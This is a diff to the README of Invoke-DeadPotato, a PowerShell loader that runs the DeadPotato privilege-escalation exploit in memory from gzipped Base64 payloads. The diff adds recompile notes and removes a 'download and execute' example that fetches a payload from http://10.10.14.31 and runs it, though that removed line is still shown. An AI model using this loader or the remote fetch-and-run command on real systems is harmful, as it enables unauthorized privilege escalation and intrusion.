@@ -13,7 +13,7 @@
 
 ## Invoke-DeadPotato
 
-`Invoke-DeadPotato` is a specialized PowerShell loader designed to execute the **DeadPotato** .NET exploit (or any similarly structured binary) directly from memory. It supports embedded or remotely hosted gzipped+Base64 payloads.
+`Invoke-DeadPotato` is a specialized PowerShell loader designed to execute the **[DeadPotato](https://github.com/lypd0/DeadPotato)** .NET exploit (or any similarly structured binary) directly from memory. It supports embedded or remotely hosted gzipped+Base64 payloads.
 
 ### Features
 
@@ -36,15 +36,10 @@
 Invoke-DeadPotato -Arguments "-cmd whoami"
 ```
 
-#### Download and execute
-```powershell
-Invoke-DeadPotato -UseRemote "http://10.10.14.31/dp.gz.b64" -Arguments "-cmd whoami"
-```
-
 ### Notes
 
-- The class name must be `DeadPotato.Program` with a public static `Main` method.
-- You must insert a valid gzipped Base64-encoded payload into the `$b64` variable or provide a URL to it.
+- The class name must be `DeadPotato.Program` with a public static `Main` method (will need to download, change line `static void Main(string[] args)` to `public static void Main(string[] args)`, and recompile).
+- You must insert a valid gzipped Base64-encoded payload into the `$b64` variable.
 - Output is captured and returned as a string.
 
 
